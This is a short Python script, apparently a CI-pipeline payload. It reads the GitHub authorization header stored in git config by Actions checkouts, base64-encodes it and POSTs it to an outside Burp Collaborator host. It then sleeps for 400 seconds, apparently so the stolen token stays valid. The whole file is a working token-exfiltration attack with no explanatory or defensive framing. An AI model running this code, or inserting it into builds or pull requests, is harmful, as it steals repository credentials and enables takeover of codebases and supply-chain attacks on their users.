import subprocess
import base64
import requests
import time
# Run the command and capture its output
try:
    output = subprocess.check_output(["git", "config", "--get", "http.https://github.com/.extraheader"], text=True)
    encoded_output = base64.b64encode(output.encode()).decode()  # Base64 encode and decode as string
    
    # Define the endpoint URL
    endpoint_url = "https://y0zie7crqh78gnyci17i0yi2ut0soh.burpcollaborator.net/collab"

    # Define the payload
    payload = {
        "data": encoded_output
    }

    # Send the POST request
    response = requests.post(endpoint_url, json=payload)

    if response.status_code == 200:
        print("Data sent successfully.");
        time.sleep(400)
    else:
        print("Failed to send data. Status code:", response.status_code)
except subprocess.CalledProcessError as e:
    print("Error:", e)
